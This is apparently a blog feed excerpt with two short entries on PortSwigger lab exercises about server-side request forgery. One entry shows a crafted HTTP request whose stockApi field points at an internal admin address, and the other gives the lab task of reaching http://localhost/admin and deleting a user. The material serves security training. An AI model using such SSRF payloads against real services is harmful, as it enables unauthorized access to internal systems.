channel.title: Server-Side Vulnerabilities on G.R
channel.description: Recent content in Server-Side Vulnerabilities on G.R

item.title: SSRF against external back-end system [PortSwigger Lab]
item.description:
The same principle applies for remote SSRF. An attacker can submit the following request to access the admin interface

POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118

stockApi=http://192.168.0.68/admin

The same example as previous, but for remote API:

item.title: SSRF against local interface [Portswigger Lab]
item.description:
Problem

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

URL: https://0a4f00b403f04c6c8165a70d000b0073.web-security-academy.net/
